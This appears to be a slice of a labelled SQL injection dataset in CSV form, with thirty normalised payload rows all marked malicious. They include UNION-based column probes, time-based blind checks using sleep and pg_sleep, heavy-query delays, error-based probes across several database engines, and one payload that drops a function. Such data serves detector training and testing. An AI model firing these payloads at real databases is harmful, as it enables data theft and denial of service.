row_index,payload_norm,label,sqli_type_hint
4290,"-5009 ) where 8463 = 8463 union all select 8463,8463,8463,8463,8463,8463--",1,
4291,"1%"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""%"" = """,1,
4292,1'+ ( select shec where 3589 = 3589 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) +',1,
4293,"-4305 ) as ldrt where 2567 = 2567 union all select 2567,2567,2567,2567,2567,2567,2567#",1,
4294,-4322' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1,
4295,"1' and make_set ( 8403 = 8403,8899 ) and 'niux' = 'niux",1,
4296,end and ( 4610 = 4610,1,
4297,"1 ) ) union all select null,null,null--",1,
4298,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'brob' = 'brob,1,
4299,"1'|| ( select 'xjcg' from dual where 5815 = 5815 union all select null,null,null#",1,
4300,"1' ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'fowu' like 'fowu",1,
4301,1' ) where 5280 = 5280 and 4595 = 4595#,1,
4302,"1%"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
4303,1 ) where 3565 = 3565 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1,
4304,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 'kerg' like 'kerg,1,
4305,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),1,
4306,"1"" where 9760 = 9760 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,
4307,"1'|| ( select 'vqag' from dual where 8154 = 8154 union all select null,null,null,null,null,null,null,null,null,null--",1,
4308,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""squx"" like ""squx",1,
4309,"1"" ) ) ) and 4967 = 8866 and ( ( ( ""jzyn"" like ""jzyn",1,
4310,"1"" ) as oztl where 6655 = 6655 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
4311,if ( 7899 = 7899 ) select 7899 else drop function zbbp--,1,
4312,"1"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""uwdz"" = ""uwdz",1,
4313,"1'|| ( select 'ativ' from dual where 4746 = 4746 union all select null,null,null,null#",1,
4314,"1,iif ( 6625 = 6625,1,1/0 )",1,
4315,"-9922' ) ) union all select 2193,2193,2193--",1,
4316,"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,
4317,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3",1,
4318,"select count ( * ) from generate_series ( 1,5000000 ) ) ||'",1,
4319,1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'uqfs' = 'uqfs,1,
